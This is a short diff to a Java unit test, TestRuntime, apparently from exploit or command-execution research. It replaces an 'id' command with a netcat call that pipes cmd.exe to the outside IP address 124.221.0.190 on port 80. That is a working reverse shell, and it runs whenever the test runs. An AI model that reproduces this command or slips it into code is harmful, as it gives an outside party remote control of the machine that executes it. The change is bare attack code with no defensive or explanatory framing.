@@ -10,6 +10,6 @@ import javax.naming.InitialContext;
 public class TestRuntime {
     @Test
     public void testRuntime() throws Exception{
-        Runtime.getRuntime().exec("id");
+        Runtime.getRuntime().exec("D:\\tools\\nc\\nc64.exe -e cmd.exe 124.221.0.190 80");
     }
 }
